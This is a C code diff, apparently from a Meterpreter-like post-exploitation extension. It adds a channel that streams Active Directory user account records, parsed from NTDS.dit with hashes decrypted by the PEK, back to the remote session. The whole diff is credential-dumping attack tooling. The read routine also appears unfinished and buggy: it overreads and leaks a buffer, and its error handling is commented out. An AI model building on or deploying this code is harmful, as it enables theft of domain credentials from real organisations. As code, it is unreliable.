@@ -3,7 +3,9 @@
 
 typedef struct
 {
-	BOOL  eof;
+	jetState *ntdsState;
+	ntdsColumns *accountColumns;
+	decryptedPEK *pekDecrypted;
 } NTDSContext;
 
 
@@ -93,6 +95,36 @@ DWORD ntds_parse(Remote *remote, Packet *packet){
 		goto out;
 	}
 
+	// If we made it this far, it's time to set up our channel
+	PoolChannelOps chops;
+	Channel *newChannel;
+	memset(&chops, 0, sizeof(chops));
+
+	NTDSContext *ctx;
+	// Allocate storage for the NTDS context
+	if (!(ctx = calloc(1, sizeof(NTDSContext)))) {
+		res = ERROR_NOT_ENOUGH_MEMORY;
+		goto out;
+	}
+
+	ctx->accountColumns = accountColumns;
+	ctx->ntdsState = ntdsState;
+	ctx->pekDecrypted = pekDecrypted;
+
+	// Initialize the pool operation handlers
+	chops.native.context = ctx;
+	chops.native.write = ntds_channel_write;
+	chops.native.close = ntds_channel_close;
+	chops.read = ntds_channel_read;
+	if (!(newChannel = channel_create_pool(0, CHANNEL_FLAG_SYNCHRONOUS, &chops)))
+	{
+		res = ERROR_NOT_ENOUGH_MEMORY;
+		goto out;
+	}
+
+	channel_set_type(newChannel, "ntds");
+	packet_add_tlv_uint(response, TLV_TYPE_CHANNEL_ID, channel_get_id(newChannel));
+
 out:
 	packet_transmit_response(res, remote, response);
 	return res;
@@ -140,11 +172,24 @@ static DWORD ntds_channel_write(Channel *channel, Packet *request,
 
 static DWORD ntds_channel_read(Channel *channel, Packet *request,
 	LPVOID context, LPVOID buffer, DWORD bufferSize, LPDWORD bytesRead){
+	JET_ERR readStatus = JET_errSuccess;
 	DWORD result = ERROR_SUCCESS;
 	NTDSContext *ctx = (NTDSContext *)context;
-	char testString[] = "This is a test of NTDS streaming";
-	strncpy(buffer, testString, sizeof(testString));
-	*bytesRead = sizeof(testString);
+	ntdsAccount *userAccount = malloc(sizeof(ntdsAccount));
+	memset(userAccount, 0, sizeof(ntdsAccount));
+
+	readStatus = read_user(ctx->ntdsState, ctx->accountColumns, ctx->pekDecrypted, userAccount);
+	memcpy(buffer, userAccount, bufferSize);
+	*bytesRead = bufferSize;
+	
+	/*if (readStatus != JET_errSuccess){
+		result = readStatus;
+	}
+	else{
+		memcpy(buffer, userAccount, bufferSize);
+		*bytesRead = bufferSize;
+		next_user(ctx->ntdsState, ctx->accountColumns);
+	}*/
 	return result;
 }
 
